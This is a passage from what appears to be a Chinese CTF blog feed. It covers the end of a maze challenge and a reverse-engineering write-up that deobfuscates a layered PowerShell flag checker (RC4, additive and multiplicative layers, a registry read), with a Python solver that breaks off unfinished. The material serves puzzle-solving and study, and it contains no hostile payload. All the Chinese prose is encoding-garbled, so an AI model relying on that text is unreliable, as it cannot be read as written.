class="number">111111</span></span><br><span class="line"><span class="number">11011110111101</span><span class="number">111111</span></span><br><span class="line"><span class="number">11011110111101</span><span class="number">111111</span></span><br><span class="line"><span class="number">11011110111101</span><span class="number">111111</span></span><br><span class="line"><span class="number">11011110111101</span><span class="number">111111</span></span><br><span class="line"><span class="number">11101110111011</span><span class="number">111111</span></span><br><span class="line"><span class="number">11101110111011</span><span class="number">111111</span></span><br><span class="line"><span class="number">11101101010111</span><span class="number">111111</span></span><br><span class="line"><span class="number">11110101010111</span><span class="number">111111</span></span><br><span class="line"><span class="number">11110101010111</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111011101111</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111111111111</span><span class="number">111111</span></span><br><span class="line"></span><br><span class="line"><span class="number">11111111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">11101111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">11101111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">11101111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">11101111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">11101111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">11100000000011</span><span class="number">111111</span></span><br><span class="line"><span class="number">11101111111011</span><span class="number">111111</span></span><br><span class="line"><span class="number">11101111111011</span><span class="number">111111</span></span><br><span class="line"><span class="number">11101111111011</span><span class="number">111111</span></span><br><span class="line"><span class="number">11101111111011</span><span class="number">111111</span></span><br><span class="line"><span class="number">11101111111011</span><span class="number">111111</span></span><br><span class="line"><span class="number">11101111111011</span><span class="number">111111</span></span><br><span class="line"><span class="number">11100000000011</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111111111111</span><span class="number">111111</span></span><br><span class="line"></span><br><span class="line"><span class="number">11111111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111110000011</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111110111011</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111110111011</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111110111011</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111110111011</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111110111011</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111110111011</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111110111011</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111110111011</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111110000011</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111111000111</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111111010111</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111111010111</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111111000111</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111111111111</span><span class="number">111111</span></span><br><span class="line"></span><br><span class="line"><span class="number">00000000000000</span><span class="number">000000</span></span><br><span class="line"><span class="number">00000000000000</span><span class="number">000000</span></span><br><span class="line"><span class="number">00000000000000</span><span class="number">000000</span></span><br><span class="line"><span class="number">00000000000000</span><span class="number">000000</span></span><br><span class="line"><span class="number">00000000000000</span><span class="number">000000</span></span><br><span class="line"><span class="number">00000000000000</span><span class="number">000000</span></span><br><span class="line"><span class="number">00000000000000</span><span class="number">000000</span></span><br><span class="line"><span class="number">00000000000000</span><span class="number">000000</span></span><br><span class="line"><span class="number">00000000000000</span><span class="number">000000</span></span><br><span class="line"><span class="number">00000000000000</span><span class="number">000000</span></span><br><span class="line"><span class="number">00000000000000</span><span class="number">000000</span></span><br><span class="line"><span class="number">00000000000000</span><span class="number">000000</span></span><br><span class="line"><span class="number">00000000000000</span><span class="number">000000</span></span><br><span class="line"><span class="number">00000000000000</span><span class="number">000000</span></span><br><span class="line"><span class="number">00000000000000</span><span class="number">000000</span></span><br><span class="line"><span class="number">00000000000000</span><span class="number">000000</span></span><br><span class="line"><span class="number">00000000000000</span><span class="number">000000</span></span><br><span class="line"><span class="number">00000000000000</span><span class="number">000000</span></span><br><span class="line"><span class="number">00000000000000</span><span class="number">000000</span></span><br><span class="line"><span class="number">00000000000000</span><span class="number">000000</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure><p>3æ˜¯ç®±å­ï¼Œ4æ˜¯ç»ˆç‚¹ï¼Œ2æ˜¯å‡ºç”Ÿç‚¹</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">2</span></span><br><span class="line"><span class="attribute">4</span>+<span class="number">8</span></span><br><span class="line"><span class="attribute">13</span></span><br><span class="line"><span class="attribute">9</span></span><br><span class="line"><span class="attribute">21</span></span><br><span class="line"><span class="attribute">6</span>+<span class="number">7</span></span><br><span class="line"><span class="attribute">25</span></span><br><span class="line"><span class="attribute">15</span>+<span class="number">5</span>+<span class="number">11</span></span><br><span class="line"><span class="attribute">3</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">212139211325313</span></span><br></pre></td></tr></table></figure><p>md5åŠ å¤´å³å¯</p><h2 id="snake">snake</h2>]]></content>
      
      
      <categories>
          
          <category> é¢˜é›† </category>
          
          <category> CTF </category>
          
          <category> æ¯”èµ› </category>
          
      </categories>
      
      
        <tags>
            
            <tag> re </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¼ºç½‘æ‹Ÿæ€2024å¤ç°</title>
      <link href="/posts/44d650c4.html"/>
      <url>/posts/44d650c4.html</url>
      
        <content type="html"><![CDATA[<h2 id="a-game">a_game</h2><p>å‘ï¼Œæˆ‘æ‰¾äº†å¥½ä¹…èƒœåˆ©çš„æ—¶å€™çš„æ¡ä»¶ï¼Œæ²¡æƒ³åˆ°æ˜¯åœ¨é€€å‡ºçš„æ—¶å€™æ£€æŸ¥çš„QAQï¼Œä¸è¿‡å­¦åˆ°äº†æ³¨å†Œè¡¨çš„ç›¸å…³å‡½æ•°ï¼Œ</p><p><img src="https://s2.loli.net/2024/11/01/h3wZqCtpuPBMymd.png" alt="image-20241101003113092"></p><p>æŠŠè¿™é‡Œè§£å¯†çš„è„šæœ¬ç›´æ¥dumpç„¶åæ¯æ¬¡æŠŠæœ€å‰é¢çš„å‡½æ•°åæ”¹æˆWrite-Outè¾“å‡ºæ²¡æœ‰æ··æ·†çš„ç‰ˆæœ¬ï¼Œ</p><p>æ¯”å¦‚ï¼š</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Write-Output</span>( ( [<span class="type">RuntIme.INteroPsErviCEs.maRSHal</span>]::PTrtostriNGAUTo( [<span class="type">rUNtIme.inteRopServIces.MarshAl</span>]::seCuREsTrinGtobStr( <span class="variable">$</span>(<span class="string">&#x27;76492d1116743f0423413b160çœç•¥base64å†…å®¹&#x27;</span> | <span class="built_in">conveRTTo-SECureSTrinG</span>  <span class="literal">-K</span> (<span class="number">94</span>..<span class="number">117</span>)) ) ))) </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™æ—¶å¯ä»¥ç›´æ¥åœ¨pwshé‡Œæ‰§è¡Œï¼Œç„¶åå¾—åˆ°è¾“å‡ºçš„ä»£ç ï¼Œç»§ç»­è§£å¯†</p><p>ç„¶åç»§ç»­ç›´åˆ°è§£å¯†å‡ºæ¥ä»£ç </p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">enenenenene</span></span> &#123;</span><br><span class="line">    <span class="keyword">param</span>(</span><br><span class="line">        <span class="variable">$plaintextBytes</span>,</span><br><span class="line">        <span class="variable">$keyBytes</span></span><br><span class="line">    )</span><br><span class="line">    <span class="comment"># Initialize S and KSA</span></span><br><span class="line">    <span class="variable">$S</span> = <span class="number">0</span>..<span class="number">255</span></span><br><span class="line">    <span class="variable">$j</span> = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> <span class="operator">-lt</span> <span class="number">256</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$j</span> = (<span class="variable">$j</span> + <span class="variable">$S</span>[<span class="variable">$i</span>] + <span class="variable">$keyBytes</span>[<span class="variable">$i</span> % <span class="variable">$keyBytes</span><span class="type">.Length</span>]) % <span class="number">256</span></span><br><span class="line">        <span class="variable">$temp</span> = <span class="variable">$S</span>[<span class="variable">$i</span>]</span><br><span class="line">        <span class="variable">$S</span>[<span class="variable">$i</span>] = <span class="variable">$S</span>[<span class="variable">$j</span>]</span><br><span class="line">        <span class="variable">$S</span>[<span class="variable">$j</span>] = <span class="variable">$temp</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># PRGA and encryption</span></span><br><span class="line">    <span class="variable">$i</span> = <span class="number">0</span></span><br><span class="line">    <span class="variable">$j</span> = <span class="number">0</span></span><br><span class="line">    <span class="variable">$ciphertextBytes</span> = <span class="selector-tag">@</span>()</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$k</span> = <span class="number">0</span>; <span class="variable">$k</span> <span class="operator">-lt</span> <span class="variable">$plaintextBytes</span>.Length; <span class="variable">$k</span>++) &#123;</span><br><span class="line">        <span class="variable">$i</span> = (<span class="variable">$i</span> + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        <span class="variable">$j</span> = (<span class="variable">$j</span> + <span class="variable">$S</span>[<span class="variable">$i</span>]) % <span class="number">256</span></span><br><span class="line">        <span class="variable">$temp</span> = <span class="variable">$S</span>[<span class="variable">$i</span>]</span><br><span class="line">        <span class="variable">$S</span>[<span class="variable">$i</span>] = <span class="variable">$S</span>[<span class="variable">$j</span>]</span><br><span class="line">        <span class="variable">$S</span>[<span class="variable">$j</span>] = <span class="variable">$temp</span></span><br><span class="line">        <span class="variable">$t</span> = (<span class="variable">$S</span>[<span class="variable">$i</span>] + <span class="variable">$S</span>[<span class="variable">$j</span>]) % <span class="number">256</span></span><br><span class="line">        <span class="variable">$ciphertextBytes</span> += (<span class="variable">$plaintextBytes</span>[<span class="variable">$k</span>] <span class="operator">-bxor</span> <span class="variable">$S</span>[<span class="variable">$t</span>])</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Return ciphertext as a string</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$ciphertextBytes</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">enenenenene1</span></span> &#123;</span><br><span class="line">    <span class="keyword">param</span>(</span><br><span class="line">        <span class="variable">$inputbyte</span></span><br><span class="line">    )</span><br><span class="line">    <span class="variable">$key</span> = <span class="selector-tag">@</span>(<span class="number">0</span>x70, <span class="number">0</span>x6f, <span class="number">0</span>x77, <span class="number">0</span>x65, <span class="number">0</span>x72)</span><br><span class="line">    <span class="variable">$encryptedText</span> = <span class="selector-tag">@</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$k</span> = <span class="number">0</span>; <span class="variable">$k</span> <span class="operator">-lt</span> <span class="variable">$inputbyte</span>.Length; <span class="variable">$k</span>++) &#123;</span><br><span class="line">        <span class="variable">$encryptedText</span> = enenenenene <span class="literal">-plaintextBytes</span> <span class="variable">$inputbyte</span> <span class="literal">-keyBytes</span> <span class="variable">$key</span>;</span><br><span class="line">        <span class="variable">$key</span> = enenenenene <span class="literal">-plaintextBytes</span> <span class="variable">$key</span> <span class="literal">-keyBytes</span> <span class="variable">$encryptedText</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$encryptedText</span> + <span class="variable">$key</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">enenenenene2</span></span> &#123;</span><br><span class="line">    <span class="keyword">param</span>(</span><br><span class="line">        <span class="variable">$inputbyte</span></span><br><span class="line">    )</span><br><span class="line">    <span class="variable">$key</span> = <span class="selector-tag">@</span>(<span class="number">0</span>x70, <span class="number">0</span>x30, <span class="number">0</span>x77, <span class="number">0</span>x65, <span class="number">0</span>x72)</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$k</span> = <span class="number">0</span>; <span class="variable">$k</span> <span class="operator">-lt</span> <span class="variable">$inputbyte</span>.Length; <span class="variable">$k</span>++) &#123;</span><br><span class="line">        <span class="variable">$inputbyte</span>[<span class="variable">$k</span>] = <span class="variable">$inputbyte</span>[<span class="variable">$k</span>] + <span class="variable">$key</span>[<span class="variable">$k</span> % <span class="variable">$key</span><span class="type">.Length</span>]</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$inputbyte</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">enenenenene3</span></span> &#123;</span><br><span class="line">    <span class="keyword">param</span>(</span><br><span class="line">        <span class="variable">$inputbyte</span></span><br><span class="line">    )</span><br><span class="line">    <span class="variable">$key</span> = <span class="selector-tag">@</span>(<span class="number">0</span>x70, <span class="number">0</span>x30, <span class="number">0</span>x77, <span class="number">0</span>x33, <span class="number">0</span>x72)</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$k</span> = <span class="number">0</span>; <span class="variable">$k</span> <span class="operator">-lt</span> <span class="variable">$inputbyte</span>.Length; <span class="variable">$k</span>++) &#123;</span><br><span class="line">        <span class="variable">$inputbyte</span>[<span class="variable">$k</span>] = <span class="variable">$inputbyte</span>[<span class="variable">$k</span>] * <span class="variable">$key</span>[<span class="variable">$k</span> % <span class="variable">$key</span><span class="type">.Length</span>]</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$inputbyte</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$registryPath</span> = <span class="string">&#x27;HKCU:\Software\PacManX&#x27;</span></span><br><span class="line"><span class="variable">$valueName</span> = <span class="string">&#x27;MYFLAG&#x27;</span></span><br><span class="line"><span class="variable">$value</span> = <span class="built_in">Get-ItemPropertyValue</span> <span class="variable">$registryPath</span> <span class="variable">$valueName</span></span><br><span class="line"><span class="variable">$plaintext</span> = <span class="selector-tag">@</span>(<span class="variable">$value</span>) | <span class="built_in">ForEach-Object</span> &#123;</span><br><span class="line">    <span class="variable">$input</span> = <span class="variable">$_</span></span><br><span class="line">    <span class="variable">$plaintext</span> = <span class="selector-tag">@</span>()</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> <span class="operator">-lt</span> <span class="variable">$input</span>.Length; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$plaintext</span> += [<span class="built_in">int</span>][<span class="built_in">char</span>]<span class="variable">$input</span>[<span class="variable">$i</span>]</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$plaintext</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$plaintext</span>.Length <span class="operator">-ne</span> <span class="number">36</span>) &#123;</span><br><span class="line">    <span class="built_in">Set-Content</span> <span class="literal">-Path</span> <span class="string">&quot;log.txt&quot;</span> <span class="literal">-Value</span> <span class="string">&quot;ERROR&quot;</span></span><br><span class="line">    <span class="keyword">exit</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$encrypted1Text</span> = enENenenene2 <span class="literal">-inputbyte</span> (enenenENene2 <span class="literal">-inputbyte</span> (enenenenene3 <span class="literal">-inputbyte</span> (Enenenenene2 <span class="literal">-inputbyte</span> (enenenenene2 <span class="literal">-inputbyte</span> (enenenenene2 <span class="literal">-inputbyte</span> (enenenenene1 <span class="literal">-input</span> <span class="variable">$plaintext</span>))))))</span><br><span class="line"><span class="variable">$result</span> = <span class="selector-tag">@</span>(<span class="number">38304</span>, <span class="number">8928</span>, <span class="number">43673</span>, <span class="number">25957</span> , <span class="number">67260</span>, <span class="number">47152</span>, <span class="number">16656</span>, <span class="number">62832</span> , <span class="number">19480</span> , <span class="number">66690</span>, <span class="number">40432</span>, <span class="number">15072</span> , <span class="number">63427</span> , <span class="number">28558</span> , <span class="number">54606</span>, <span class="number">47712</span> , <span class="number">18240</span> , <span class="number">68187</span> , <span class="number">18256</span>, <span class="number">63954</span> , <span class="number">48384</span>, <span class="number">14784</span>, <span class="number">60690</span> , <span class="number">21724</span> , <span class="number">53238</span> , <span class="number">64176</span> , <span class="number">9888</span> , <span class="number">54859</span> , <span class="number">23050</span> , <span class="number">58368</span> , <span class="number">46032</span> , <span class="number">15648</span> , <span class="number">64260</span> , <span class="number">17899</span> , <span class="number">52782</span> , <span class="number">51968</span> , <span class="number">12336</span> , <span class="number">69377</span> , <span class="number">27844</span> , <span class="number">43206</span> , <span class="number">63616</span>)</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$k</span> = <span class="number">0</span>; <span class="variable">$k</span> <span class="operator">-lt</span> <span class="variable">$result</span>.Length; <span class="variable">$k</span>++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$encrypted1Text</span>[<span class="variable">$k</span>] <span class="operator">-ne</span> <span class="variable">$result</span>[<span class="variable">$k</span>]) &#123;</span><br><span class="line">        <span class="built_in">Set-Content</span> <span class="literal">-Path</span> <span class="string">&quot;log.txt&quot;</span> <span class="literal">-Value</span> <span class="string">&quot;ERROR&quot;</span></span><br><span class="line"> <span class="keyword">exit</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">Set-Content</span> <span class="literal">-Path</span> <span class="string">&quot;log.txt&quot;</span> <span class="literal">-Value</span> <span class="string">&quot;RIGHT&quot;</span></span><br></pre></td></tr></table></figure><p>ç„¶åç›´æ¥é€†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> prism <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_encrypt</span>(<span class="params">plaintext_bytes, key_bytes</span>):</span><br><span class="line">    S = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + S[i] + key_bytes[i % <span class="built_in">len</span>(key_bytes)]) % <span class="number">256</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    ciphertext_bytes = []</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(plaintext_bytes)):</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + S[i]) % <span class="number">256</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line">        t = (S[i] + S[j]) % <span class="number">256</span></span><br><span class="line">        ciphertext_bytes.append(plaintext_bytes[k] ^ S[t])</span><br><span class="line">    <span class="keyword">return</span> ciphertext_bytes</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">multi_layer_rc4_encrypt</span>(<span class="params">input_bytes</span>):</span><br><span class="line">    key = [<span class="number">0x70</span>, <span class="number">0x6f</span>, <span class="number">0x77</span>, <span class="number">0x65</span>, <span class="number">0x72</span>]</span><br><span class="line">    encrypted_text = []</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(input_bytes)):</span><br><span class="line">        encrypted_text = rc4_encrypt(input_bytes, key)</span><br><span class="line">        key = rc4_encrypt(key, encrypted_text)</span><br><span class="line">    <span class="keyword">return</span> encrypted_text + key</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">additive_encrypt</span>(<span class="params">input_bytes</span>):</span><br><span class="line">    key = [<span class="number">0x70</span>, <span class="number">0x30</span>, <span class="number">0x77</span>, <span class="number">0x65</span>, <span class="number">0x72</span>]</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(input_bytes)):</span><br><span class="line">        input_bytes[k] = (input_bytes[k] + key[k % <span class="built_in">len</span>(key)]) &amp; <span class="number">0xFF</span>  <span class="comment"># Ensure bytes are in range 0-255</span></span><br><span class="line">    <span class="keyword">return</span> input_bytes</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">multiplicative_encrypt</span>(<span class="params">input_bytes</span>):</span><br><span class="line">    key = [<span class="number">0x70</span>, <span class="number">0x30</span>, <span class="number">0x77</span>, <span class="number">0x33</span>, <span class="number">0x72</span>]</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(input_bytes)):</span><br><span class="line">        input_bytes[k] = (input_bytes[k] * key[k % <span class="built_in">len</span>(key)]) &amp; <span class="number">0xFF</span>  <span class="comment"># Ensure bytes are in range 0-255</span></span><br><span class="line">    <span class="keyword">return</span> input_bytes</span><br><span class="line"></span><br><span class="line">result = [<span class="number">38304</span>, <span class="number">8928</span>, <span class="number">43673</span>, <span class="number">25957</span> , <span class="number">67260</span>, <span class="number">47152</span>, <span class="number">16656</span>, <span class="number">62832</span> , <span class="number">19480</span> , <span class="number">66690</span>, <span class="number">40432</span>, <span class="number">15072</span> , <span class="number">63427</span> , <span class="number">28558</span> , <span class="number">54606</span>, <span class="number">47712</span> , <span class="number">18240</span> , <span class="number">68187</span> , <span class="number">18256</span>, <span class="number">63954</span> , <span class="number">48384</span>, <span class="number">14784</span>, <span class="number">60690</span> , <span class="number">21724</span> , <span class="number">53238</span> , <span class="number">64176</span> , <span class="number">9888</span> , <span class="number">54859</span> , <span class="number">23050</span> , <span class="number">58368</span> , <span class="number">46032</span> , <span class="number">15648</span> , <span class="number">64260</span> , <span class="number">17899</span> , <span class="number">52782</span> , <span class="number">51968</span> , <span class="number">12336</span> , <span class="number">69377</span> , <span class="number">27844</span> , <span class="number">43206</span> , <span class="number">63616</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">multi_layer_rc4_decrypt</span>(<span class="params">input_bytes</span>):</span><br><span class="line">    <span class="comment"># key = [0x70, 0x6f, 0x77, 0x65, 0x72]</span></span><br><span class="line">    <span class="comment"># input_bytes = input_bytes[:-5]</span></span><br><span class="line">    input_bytes,key_last = input_bytes[:-<span class="number">5</span>],input_bytes[-<span class="number">5</span>:]</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(input_bytes)):</span><br><span class="line">        key_last = rc4_encrypt(key_last, input_bytes)</span><br><span class="line">        input_bytes = rc4_encrypt(input_bytes, key_last)</span><br><span class="line">        <span class="comment"># print(input_bytes)</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">all</span>(input_byte&lt;=<span class="number">127</span> <span class="keyword">and</span> input_byte&gt;=<span class="number">32</span> <span class="keyword">for</span> input_byte <span class="keyword">in</span> input_bytes):</span><br><span class="line">                pl(input_bytes,<span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> input_bytes</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">additive_decrypt</span>(<span class="params">input_bytes</span>):</span><br><span class="line">    key = [<span class="number">0x70</span>, <span class="number">0x30</span>, <span class="number">0x77</span>, <span class="number">0x65</span>, <span class="number">0x72</span>]</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(input_bytes)):</span><br><span class="line">        input_bytes[k] = (input_bytes[k] - key[k % <span class="built_in">len</span>(key)])  <span class="comment"># Ensure bytes are in range 0-255</span></span><br><span class="line">    <span class="keyword">return</span> input_bytes</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">multiplicative_decrypt</span>(<span class="params">input_bytes</span>):</span><br><span class="line">    key = [<span class="number">0x70</span>, <span class="number">0x30</span>, <span class="number">0x77</span>, <span class="number">0x33</span>, <span class="number">0x72</span>]</span><br><span class="line">    <span class="comment"># inv_key = [mod_inverse(key[i], 0xff) for i in range(5)]</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(input_bytes)):</span><br><span class="line">        <span class="keyword">assert</span> input_bytes[k] % key[k % <span class="built_in">len</span>(key)] == <span class="number">0</span></span><br><span class="line">        input_bytes[k] = (input_bytes[k] // key[k % <span class="built_in">len</span>(key)])  <span class="comment"># Ensure bytes are in range 0-255</span></span><br><span class="line">    <span class="keyword">return</span> input_bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">res = 